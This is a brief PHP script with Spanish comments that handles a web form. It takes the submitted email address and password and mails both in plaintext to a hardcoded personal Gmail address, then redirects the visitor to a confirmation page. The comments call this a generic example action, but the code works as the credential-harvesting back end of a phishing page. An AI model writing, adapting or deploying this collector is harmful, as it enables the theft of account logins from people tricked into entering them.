<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST["email"];
    $contrasena = $_POST["password"];
    $asunto = $_POST["subject"];

    // Aquí puedes realizar alguna acción con los datos, por ejemplo, enviar un correo electrónico
    $destinatario = "mvalverde400@gmail.com";
    $mensaje = "Correo electrónico: $correo\nContraseña: $contrasena";

    // Puedes personalizar el contenido del correo según tus necesidades
    mail($destinatario, $asunto, $mensaje);

    // Puedes redirigir a una página de confirmación o realizar otras acciones después del envío
    header("Location: confirmacion.html");
    exit();
} else {
    // Si alguien intenta acceder directamente al script, redirige a la página principal
    header("Location: index.html");
    exit();
}
?>
